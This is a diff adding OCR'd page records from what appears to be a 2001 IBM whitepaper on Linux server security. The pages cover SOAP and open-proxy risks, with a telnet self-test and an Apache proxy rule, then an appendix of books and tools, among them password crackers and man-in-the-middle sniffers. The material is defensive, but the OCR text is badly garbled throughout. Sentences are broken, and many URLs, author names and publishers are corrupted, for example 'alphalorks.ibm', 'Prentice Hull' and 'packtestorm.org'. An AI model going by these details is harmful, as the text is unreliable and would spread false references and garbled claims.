+    client it is as simple as specifying "https" versus "http". Of course, your server
+
+    needs to have built with SSL support.
+
+    - Consider using Apache Tomcat facet to handle SOAP requests. For
+
+    examples, see the SOAP:Lite cookbook at (http://cookbook.soaplite.com/).
+
+    - Be aware that SOAP is one of the possible benefits for Web services⁴, so
+
+    y Web services strategy and security policy should be able to accommodate\multiple
+    transport protocols in the future.
+
+    - As Web services are emerging technologies, it is worthwhile to follow the
+
+    development of Web services. For example, there is a prototype
+
+    implementation of SOAP encryption in the Web Services Toolkit
+
+    (http://www.alphalorks.ibm/tech/webservicestoolkit). You may also want to
+
+    follow the progress of the W3C XML Encryption workgroup
+
+    (http://www.w3.org/Encryption/2001/).
+
+
+    # Web proxies
+
+
+    Ordinarily, a web, or proxy server, is a dedicated server located between a local
+
+    network DMZ and the outside world, trafficking and "proxy-ing" internal users
+    or
+
+    custom Web requests to the Internet, often caching the Web page results in
+
+    to accelerate subsequent requests to the same URL. However, proxy servers are
+    often even
+
+    to misconfigure, which can allow any Internet user to proxy their HTTP requests
+    through
+
+    t misconfigured server to other destinations. Further, many Web services are run
+    as
+
+    proxies without their administrators introducing to proxy servers at all (due
+
+    ofault or erroneous configurations). These are considered "open proxies" by the
+
+    security community, and are often cataloged on various Web sites. Malicious users
+
+    tempt to use proxy servers to anonymize their own browsing, or to mimic
+
+
+    > ³³ SOAP-DIG - http://www.ibm.com/developers/webservices/library/ws-soapsec/
+
+    ⁴⁴ WSIF is a SOAP-independent framework for accessing Web Services -- http://www-
+
+    106.ibm.com/developers/webservices/library/ws-wsif.html
+
+
+    © Copyright IBM. Corp. 2001. All rights reserved.'
+  merge: -1
+  pgno: 44
+- img_proc: true
+  md: 'valid users in an effort to gain internal access. Recently, this latter example
+    was exploited by a hacker using an open proxy at MCI WorldCom³⁵. Using an open
+    proxy scanner called “Proxy Hunter”, the hacker found an open proxy, and proceeded
+    to browse WorldCom''s Intranet, appearing as a valid employee, allegedly perusing
+    a variety of sensitive employee data. A similar example occurred at Excite@Home
+    which allowed access through a misconfigured proxy into the internal network,
+    allegedly exposing Excite@Home''s customer list of 2.95 million mobile subscribers.³⁶
+
+
+    Configuring your server to properly allow or disallow proxy is critical to a secure
+    provider infrastructure. A simple way is to test if your server HTTP is proxied
+    to your server, and an HTTP request to a different host:
+
+
+    ```
+
+    [root@imorder~$] telnet your.server.com 80
+
+    Trying 192.12.17.99...
+
+    Connected to your.server.com (192.12.17.99).
+
+    Escape character is ""
+
+    GET http://othersite.com/HTTP/1.0
+
+    [ hit enter/return twice ]
+
+    ```
+
+
+    If you get HTML data from http://othersite.com, your server is probably misconfigured,
+    as your server is returning data from a foreign host - likely not what you intended
+    if you are not running http://your.server.com as a proxy server. If you get HTML
+    data from your server, or an error, your server is likely configured to respond
+    to proxy requests correctly. If you need to use a proxy, make sure the following
+    is correctly defined and in your http.conf (if you are not using this server as
+    a proxy, comment out or remove these directives altogether):
+
+
+    ```
+
+    <Directory proxy/>
+
+    Order deny,allow
+
+    Deny from all
+
+    Allow from your.server.com
+
+    </Directory>
+
+    ```
+
+
+    Misconfigurations or default installations in Web servers can lead to potential
+    security vulnerabilities via open proxies. Web proxy protection is an essential
+    aspect of any service provider security policy.
+
+
+    # Conclusion
+
+
+    Providing effective security in a service provider infrastructure is a complex
+    task, but a task made more flexible, cost effective, and powerful with Linux.
+    In today''s highly networked world, service providers are constantly faced with
+    balancing between customer access and functionality and the protection of users
+    and data. Each day seems to bring new Internet-based threats, ranging from service
+    disruption to total system
+
+
+    > ³⁵ http://www.linuxsecurity.com/articles/hackcracks article-4124.html
+
+    ³⁶ http://www.securityfocus.com/news/209'
+  merge: -1
+  pgno: 45
+- img_proc: true
+  md: '# IBM
+
+
+    Keeping your business safe from this harsh environment takes a well designed and
+    managed security framework.
+
+
+    As we''ve seen from the various server scenarios, Open systems and software have
+    a security advantage over closed systems - the ability for all parts of the code
+    to not just be scrutinized, but expanded and applied in new and interesting ways.
+    This allows the community to respond and react to security incidents and vulnerabilities
+    at a speed unequal to the closed system world. A recent example of this came from
+    the Nimda worm. Although this exploits a variety of vulnerabilities in Microsoft
+    products, such as IIS, Internet Explorer and Outlook, it also allows the worm
+    to quickly spread across an entire enterprise through a network via a single infection
+    point. In response to this threat, a Samba users group in Japan discovered they
+    could apply the “veto files” in the Samba configuration file to stop the worm
+    from spreading across Samba-powered network shares. This information was quickly
+    spread through newsgroups and mail lists, and is now included in the latest Samba
+    distribution as a specific README file³⁷. Further, this technique can be applied
+    to prevent the distribution of any Win32 worm attempts to spread through Samba
+    network shares. There are many similar examples, and for all intents, how the
+    Open Source community operates – Open systems using creative use and application,
+    and then rapid knowledge transfer back into the community. This dynamic system
+    is a considerable advantage to security strategy, as it provides the flexibility
+    to permit a corporation to take a more effective and functional role in managing
+    the overall security of its server infrastructure.
+
+
+    Hopefully, this paper provided you with practical information to secure your Linux
+    systems and to expand your overall Linux security framework. As Linux is proving
+    to be the fastest operating system in the market, understanding how to develop
+    a security framework for your server environment is, and will continue to be,
+    a critical part of a service provider infrastructure.
+
+
+    # Acknowledgements
+
+
+    Special thanks to Doc Shankar, Norm Patten, Jim Crosskey, Clifford Word, George
+    Dolbier, and Emily Rattiff for their comments and input on this paper.
+
+
+    > ³⁷ http://us1.samba.org/samba/flp/docs/README.Win32-Viruses'
+  merge: -1
+  pgno: 46
+- img_proc: true
+  md: '# # Appendix - Resources
+
+
+    **NOTE:** The resources, Web sites, and tools listed in this document are not
+    endorsed, recommended, or supported by IBM. These resources are provided as reference
+    only – if you use these resources, you do so at your own risk. With all security
+    related analysis, use only your equipment and networks and get permission from
+    all parties of authority over the systems you are testing.
+
+
+    # ## Resources - Mailing Lists
+
+
+    +   - CERT (http://www.cert.com)
+
+    - SANS (http://www.sans.com/sansnews)
+
+    - SecurityFocus lists (http://www.securityfocus.com)
+
+    - SAFER (http://www.safermag.com/)
+
+    - Firewalls (http://lists.gnac.net/firewalls/)
+
+    - Firewall-Wizards (http://www.nrf.com/mailman/listinfo/firewall-wizards)
+
+
+    # ## Resources - Web Sites
+
+
+    +   - Linux Security HOWTO http://www.linuxdoc.org/HOWTO/Security-HOWTO.html
+
+    - Incidents.org http://www.incidents.org/
+
+    - LinuxSecurity.com http://www.linuxsecurity.com/
+
+    - Linux IPTables HOWTO http://netflix.samba.org/unreliable-guides/packet-filtering-HOWTO/packet-filtering-HOWTO.document
+
+    - Sendmail.net http://sendmail.net/?feed=000705securitygeneral
+
+    - Packtestorm http://packtestorm.org/
+
+    - SecurityFocus http://www.securityfocus.com/
+
+    - Digital Information Society http://www.phreat.org/html/main.shtml
+
+    - National Infrastructure Protection Center http://www.nipc.gov/
+
+    - Secure Programming for Linux and Unix HOWTO http://linux.math.tifr.res.in/howto/Secure-Programs-HOWTO.html
+
+
+    # ## Resources - Books
+
+
+    +   - Intrusion Detection, Rebecca Bae, Macmillan Technology Series
+
+    - Real World Linux Security, Bob Toxen, Prentice Hull
+
+    - Hacking Exposed, Brian Hatch, James Lee, George Kurtz, McGraw Hill
+
+    - Applied Cryptography, 2nd Edition, Bruce Schneier, Wiley
+
+    - Network Intrusion Detection – An Analysts Handbook, Stephen Northcott, Riders
+
+    - Linux Security (Craig Hunt Linux Library), Ramon J. Hotanton, Craig Hunt, Sybex
+
+    - TCP/IP Illustrated (Volumes 1, 2 and 3), W. Richard Stevens, Gary R. Wright
+    (Contributor), Wright Gary R., Addison-Wesley'
+  merge: -1
+  pgno: 47
+- img_proc: true
+  md: '+   - Maximum Linux Security : A Hacker''s Guide to Protecting Your Linux Server
+    and
+
+    Network, Anonymous, Sams.
+
+
+    # Resources - Tools
+
+
+    (Note: much of the content below is derived from the respective tools documentation
+    or
+
+    Web sites)
+
+
+    # Application Security
+
+
+    Whisker
+
+    Rain.Forest.Puppy''s excellent CGI vulnerability scanner
+
+
+    Flawfinder
+
+    Flawfinder is a Python program that searches through source code for potential
+    security
+
+    flaws, listing potential security flaws sorted by risk, with the most dangerous
+
+    aws shown first. This risk level depends only on the function, but on the values
+    of
+
+    parameters of the function.
+
+
+    StackGuard
+
+    StackGuard is a compiler that secures programs against "stack smashing" attacks.
+
+    Stack smashing attacks are a common form of penetration attack. Programs that
+
+    been compiled with StackGuard are largely immune to stack smashing attacks. Protection
+
+    requires no source code changes at
+
+
+    Libsafe
+
+    It is generally accepted that the best solution to buffer overflow and string
+    attacks
+
+    is to fix the defective programs. However, fixing defective programs requires
+    knowing
+
+    that particular program is defective. The true benefit of using Libsafe and other
+
+    alternative security measures is protection against future attacks on programs
+    that are not
+
+    known to be vulnerable. Libsafe is under GPL.
+
+
+    # Intrusion Detection Systems
+
+
+    Tripwire
+
+    (Commercial: http://www.tripwire.com
+
+    Open Source: http://www.tripwire.org)
+
+    A file and directory checker. Tripwire is a tool that aids system administrators
+
+    and users in monitoring a designated set of files for any changes. Used system
+    files
+
+    a a regular (e.g., daily) basis, Tripwire can notify administrators of corrupted
+    or
+
+    tampered files, so damage control measures can be taken in a timely manner.
+
+
+    Tripwire for Servers software ensures the security and the integrity of data on
+    your servers
+
+    by notifying users if, and when they have changed.
+
+
+    LIDS
+
+    The LIDS (Linux Intrusion Detection System) is an intrusion detection/defense
+    system in
+
+    the Linux kernel. The goal is to protect Linux systems against root intrusions,
+    by'
+  merge: -1
+  pgno: 48
+- img_proc: true
+  md: '# IBM
+
+
+    disabling some system calls in the kernel itself. Brian Hatch, author of “Hacking
+    Linux Exposed”, has written a great walk-through of LIDS:
+
+    http://www.security.com/infocus/1496
+
+
+    AIDE (http://www.cs.tu_ft.edu/~rammer/aide.html)
+
+    - AIDE (Advanced Intrusion Detection Environment) is an Open Source IDS package.
+
+
+    Snort (http://www.snort.org)
+
+    Flexible packet sniffer/logger that detects attacks. Snort is a libcap-based packet
+    sniffer/logger which can be used as a lightweight network intrusion detection
+    system. It features rules logging and can perform searching/matching in addition
+    to being used to detect a variety of other attacks and probes, such as buffer
+    overflows, stealth port scans, CGI attacks, bombs and much more. Snort has a real-time
+    alerting capability, with alerts being sent to syslog, a separate “alert” file,
+    or even to a Windows computer via Samba. In a recent IDS named the “top performer”
+    out of the 16 IDS reviewed: http://www.vnunet.com/News/1127283.
+
+
+    Samhain (http://www.samhain.sourceforge.net)
+
+    Samhain is designed for intuitive configuration and tamper-resistance, and can
+    be configured as a client/server application to monitor hosts on a network from
+    a single central location. Samhain uses a PGP-signature database of signatures,
+    including a cryptographic checksum, compares the current state of files and directories
+    against this database, identifies changes, and reports on them if a policy violation
+    is detected. Samhain is under GPL.
+
+
+    # Security Testing Tools
+
+
+    Nmap (http://www.insecure.org/nmap)
+
+    The premier network auditing and testing tool (detailed in the main body of document
+    above).
+
+
+    LSOF (flp://vic.cc.purdue.edu/pub/tools/unix/lsof)
+
+    lsof opens files for running Unix/Linux processes.
+
+
+    Netcat (http://www.atstake.com/research/tools/index.html)
+
+    Netcat is a utility which reads and writes across network connections using TCP
+    or UDP protocol. It is designed to be a reliable “back-end” tool that can be used
+    directly or easily by other programs and scripts. At the same time, it is a feature-rich
+    network debugging and exploration tool since it can create almost any sort of
+    connection you need and has interesting built-in capabilities.
+
+
+    Hping2 (http://www.kyuzz.org/antirez/hping/)
+
+    hping2 is a network tool to send ICMP/UDP/TCP packets and to display targets replies
+    like ping with ICMP replies. It handles fragmentation and arbitrary packet size,
+    and can be used to transfer files under supported protocols. Using hping2, you
+    can test firewall rules, perform port scanning, test net performance using'
+  merge: -1
+  pgno: 49
+- img_proc: true
+  md: "# IBM\n\ndifferent protocols, packet size, TOS (type of service), and fragmentation,\
+    \ perform path MTU discovery, transfer files, perform traceroute-like actions\
+    \ under different protocols, fingerprint remote OSs, as TCP/IP stack, hping2 is\
+    \ also a very good tool for learning TCP/IP.\n\nNemesis (http://www.packetninja.net/nemesis/)\n\
+    The Nemesis Project is designed to be a command line-based portable human IP stack\
+    \ for UNIX/Linux. The suite is broken down by protocol, and should allow for useful\
+    \ scripting of injecting packet streams from simple shell scripts.\n\nFirewalk\
+    \ (http://www.packetfactory.net/Projects/Firewall/)\nFirewalk is a technique developed\
+    \ by MDS and DHG that employs traceroute-like techniques to analyze IP packet\
+    \ responses to gateway ACL filters and map networks. Firewalk employs the technique\
+    \ to filter rules in place on a packet forwarding device. The newest version of\
+    \ the tool, firewall/GTK introduces the option of using a graphical interface\
+    \ and a few bugs.\n\nCheops (http://www.marko.net/cheops/)\nA GTK-based network\
+    \ \"Swiss-army-knife.\" Cheops gives a simple interface to manage network utilities,\
+    \ maps local or networks and can show OS types of the machines on the network,\
+    \ similar to what a file manager does with your file system.\n\nSendIP (http://www.earth.li/projectpurge/sendip.html)\n\
+    SendIP has a large number of command options to select the content of every header\
+    \ of RIP, TCP, UDP, ICMP or raw IPv4 and IPv6 packet. It also allows any data\
+    \ to be added to the packet. Checksums can be calculated automatically, but if\
+    \ you wish to send out wrong checksums, which is supported too.\n\n# Password\
+    \ Tools\n\nCrack / Libcrack (http://www.users.dircen.co.uk/-crypto/)\nCrack 5\
+    \ is an update version of Alec Muff's classic local password cracker. Traditionally\
+    \ these allowed any user of a system to crack the /etc/passwd and determine the\
+    \ passwords of other users (or root) on the system. Modern systems require you\
+    \ to obtain read access to /etc/shadow in order to perform this. It is a very\
+    \ good idea for sysadmins to run a cracker occasionally to verify that all users\
+    \ have strong passwords.\n\nJohn The Ripper (http://www.openwall.com/john/)\n\
+    \ active password cracking tool, \"John\", normally called \"John the Ripper\"\
+    , is a tool to find weak passwords of your users.\n\nPasswdqc (http://www.openwall.com/passwdqc)\n\
+    pam passwdqc is a simple password strength checking module for PAM-aware password\
+    \ changing programs, such as passwd(1). In addition to checking regular passwords,\
+    \ it offers support for passphrases and can provide randomly generated passwords."
+  merge: -1
+  pgno: 50
+- img_proc: true
+  md: '# IBM
+
+
+    Npassword (http://www.utexas.edu/cc/unix/software/npassword/)
+
+    password is a replacement command for the password for Unix/Linux systems. New
+    passwords are stringently to decrease the chance of having passwords vulnerable
+    to guessing by programs as Crack. In addition npasswd addresses other deficiencies
+    in many vendor-supplied password programs. Combining intelligent password screening
+    with a shadow database provides the best protection of one-time passwords or challenge/response
+    smart card systems.
+
+
+    # Network Scanners
+
+
+    Saint (http://www.wwds.com/saint/)
+
+    SAINT (Security Administrator''s Integrated Network Tool) is a security assessment
+    tool based on SATAN. Features include scanning through a firewall, updated security
+    checks from CERT & CIAC bulletins, levels of severity (red, yellow, brown, & green)
+    and an HTML interface.
+
+
+    SARA (http://www-arc.com/sara/)
+
+    Security Auditor''s Research Assistant (SARA) is a 3rd generation security analysis
+    tool that is based on the SATAN model which is covered by the GNU GPL-like open
+    license. It is fostering a collaborative environment and is updated periodically
+    to address latest threats.
+
+
+    Internet Security Scanner (http://www.iss.net)
+
+    A popular commercial network security scanner.
+
+
+    Nessus (http://www.nessus.org)
+
+    Remote network security auditor. The Nessus Security Scanner is a security auditing
+    tool. It makes possible to test security modules in an attempt to find vulnerable
+    spots that should be fixed. It is composed of a server and a client. The server/daemon,
+    nessius, is in charge of the attacks, whereas the client, nessus, provides the
+    user with an X11/GTK-based interface.
+
+
+    # Port Scan Detectors
+
+
+    Abacus Portsentry (http://www.psionic.com/abacus/portsentry/)
+
+    Pscans detection daemon Portsentry has the ability to detect port scans (including
+    stealth scans) on the network interfaces of any user. Upon arrival it can block
+    the attack via hosts.deny, dropped route or firewall rule. If you have no idea
+    what a port/alth scan is, I''d recommend having a look at http://www.psionic.com/abacus/portsentry/
+    before installing this package. It might easily block hosts you are not intending
+    to (e.g., your NFS-server, name-server, etc.).
+
+
+    Klaxon (http://www.eng.auburn.edu/users/doug/second.html#Security)'
+  merge: -1
+  pgno: 51
+- img_proc: true
+  md: '# IBM
+
+
+    A modification to rebec, but instead actually executing anything, it returns a
+    benign
+
+    error to the caller, and syslogs the calling host, username, and name of attempted
+    service
+
+    access. Also, useful for detecting scanner attacks like those perpetrated by ISS
+    and
+
+    SATAN.
+
+
+    Scanlog
+
+
+    scanlog is a TCP port scan detection tool, originally designed to illustrate various
+
+    attacks on an IDS server to deal with.
+
+
+    # Encryption
+
+
+    Stunnel
+
+
+    Stunnel is a program that allows you to encrypt arbitrary TCP connections using
+    SSL
+
+    (Secure Socket Layer) over both Unix and Windows. Stunnel can allow you to
+
+    secure-non aware demands and protocols (like POP, IMAP, NNTP, LDAP, etc) by
+
+    having Stunnel provide the encryption, requiring no changes to the daemon''s code.
+
+
+    # OpenSSH / SSH
+
+
+    Secure login/rsh/rcp replacement, OpenSSH is derived from OpenBSD''s version of
+    ssh,
+
+    which was in turn derived from ssh code before the time ssh''s license was
+
+    changed to non-free. S (Secure Shell) is a program for logging into a remote
+
+    machine and for executing commands on a remote machine. It provides secure encrypted
+
+    communications between two untrusted hosts over an insecure network. X11
+
+    connections and arbitrary TCP/IP ports can also be forwarded over the secure channel.
+    It
+
+    is intended to be a replacement for rlogin, rsh and rcp, and can be used to provide
+    rdist,
+
+    and rys with a secure communication channel.
+
+
+    # GnuPG
+
+
+    GnuPG is a complete and free replacement for PGP. Because it does not use the
+    patented
+
+    IDEA algorithm, it can be used without any restrictions. GnuPG is a RFC2440
+
+    (OpenPGP) compliant application. GnuPG is a useful utility for creating and validating
+
+    software packages. For example, Red Hat signs their RPM packages with GnuPG
+
+    generated digital signatures.
+
+
+    # Log and Traffic Monitors
+
+
+    MRTG
+
+
+    The Multi Router Traffic Graph (MRTG) is a tool to monitor the traffic load on
+
+    network-links. MRTG generates HTML pages containing PNG images which provide a
+
+    live representation of this traffic. MRTG can be extended with RRDtool
+
+    graphing and storage/retrieval of time-series data. Both of these tools are very
+    useful for
+
+    keeping an eye on your network traffic capacity – often an indicator of an attack.'
+  merge: -1
+  pgno: 52
+- img_proc: true
+  md: '# IBM
+
+
+    Swatch (http://www.stanford.edu/~atkins/swatch/)\Swatch, the Simple Watch Daemon
+    is a program for UNIX system logging, originally written to actively monitor messages
+    that are written to a log file via the UNIX syslog utility. Swatch was designed
+    to keep system administrators from being overwhelmed by large quantities of data.
+    It monitors log files and acts to filter out unwanted data and take one or more
+    user actions based on patterns in the log. Swatch can monitor information if it
+    is being appended to the log file and switch administrators immediately to serious
+    system problems as they occur.
+
+
+    Timbersee (http://www.fastcoder.net/thumper/sysadmin/timbersee/)\Timbersee is
+    a program very similar to the Swatch program. It is used to monitor log files
+    for important messages, but in that it can monitor more than one log file at a
+    time, and does not fork off extra processes. Another difference from other tools
+    that the configuration file is an XML file which is validated at program.
+
+
+    Logsurf (http://www.cert.de/en/logsurf/)
+
+    The program “logsurfer” is designed to monitor text-based logs on your system
+    in real time. The large amount of log information collected (like all handled
+    by the syslog-daemon or ftp, Web servers, etc.) makes it very difficult to check
+    your logs manually to find any unusual activity. It is useful to have a program
+    that does monitoring on your behalf – particularly in large server environments.
+    If you don''t want to use a script that checks your logs in certain time (nightly,
+    weekly, etc.) then you might be interested in the programs like swatch or logsurfer.
+
+
+    TCP Wrappers (http://ftp.porcupine.org/pub/security/index.html)
+
+    Wiestene''s network logger, also known as TCPD or LOG_TCP. These programs log
+    the client host name of innet, ftp, rsh, login, finger etc requests. Security
+    options are: access control for host, domain and/or service; detection of host
+    name spoofing or host spoofing; booby traps to implement an early-warning system.
+
+
+    IPLog (http://ojnk.sourceforge.net /)
+
+    iplog is a TCP/IP traffic logger. It is capable of logging TCP, UDP and ICMP traffic.
+
+
+    IPTraf (http://cebu.mozcom.com/riker/iptraf/)
+
+    ipt is an ncurses-based IP monitor that generates various network statistics including
+    TCP info, UDP counts, ICMP and OSPF information, Ethernet load info, node status,
+    checksum errors, and others.
+
+
+    Ntop (http://www.ntop.org)
+
+    top is a Unix/Linux tool that shows the network usage, similar to the popular
+    “top” Unix/Linux command.
+
+
+    Snort (http://www.snort.org)
+
+    Flexible packet sniffer/logger that detects attacks. Snort is a libcap-based packet
+    sniffer/logger which can be used as a lightweight network intrusion detection
+    system.'
+  merge: -1
+  pgno: 53
+- img_proc: true
+  md: '# IBM
+
+
+    features rules based logging and can perform content searching/matching in addition
+    to being used to detect a variety of other attacks and probes, such as buffer
+    overflows, stealth scant, CGI attacks, SMB probes, and much more. Snort has a
+    real-time alerting capability, with alerts being sent to syslog, a separate alert
+    file, or even to a Windows computer via Samba.
+
+
+    # Sniffers
+
+
+    Sniffit (http://reptile.rug.ac.be/-coder/sniffit/sniffit.html) Packet sniffer
+    and monitoring tool, sniffit is a packet sniffer for TCP/UDP/ICMP packets. sniffit
+    is able to give you very detailed technical info on these packets (SEC, ACK, TTL,
+    Window, etc.) also packet contents in different formats.
+
+
+    Tcpdump (http://tcpdump.org) A powerful tool for network monitoring and data acquisition.
+    Tcpdump program allows you to dump the traffic on a network interface interface
+    that matches a given expression. You can use this to track network problems, to
+    detect ping attacks or to monitor the network activities.
+
+
+    Dsniff (http://naughty.monkey.org/-dugsong/dsniff/) dsniff is a collection of
+    tools for network auditing and penetration testing. Includes sophisticated techniques
+    for defeating the "protection" of network switches. dsniff, sniffers, filemap,
+    msnarf, msnarl, and webspy passively monitor for interesting data (passwords,
+    e-mail, files, etc.), arspoof, dnspoof, and macof facilitate the interception
+    of network traffic normally unavailable to an attacker (e.g. on layer-2 redirected
+    ssh). sshmitt and webmitt implement active man-in-the-middle attacks against redirected
+    SSH and HTTPS sessions by exploiting weak bindings in ad-hoc PKI.
+
+
+    Ethereal (http://www.ethereal.com/) Ethereal is free network protocol analyzer
+    for Unix/Linux and Windows. It allows you to examine data from a live network
+    or a capture file on disk. You can interactively browse the capture data, viewing
+    summary and detail for each packet. Ethereal has several powerful features, including
+    a rich display filter language and the ability to view the reconstructed stream
+    of a TCP session.
+
+
+    Ngrep (http://www.packetfactory.net/Projects/ngrep/) A grep-like tool for network
+    traffic. ngrep strives to provide most of grep''s common features, applying them
+    to the network layer. ngrep is a pcap-tool that will allow you to specify extended
+    regular expressions to match data payloads of packets. It currently recognizes
+    TCP, UDP and ICMP across Ethernet, PPP, SLIP and null interfaces, and understands
+    bpf filter logic in the same fashion as more common packet sniffing tools, such
+    as tcpdump and snoop.'
+  merge: -1
+  pgno: 54
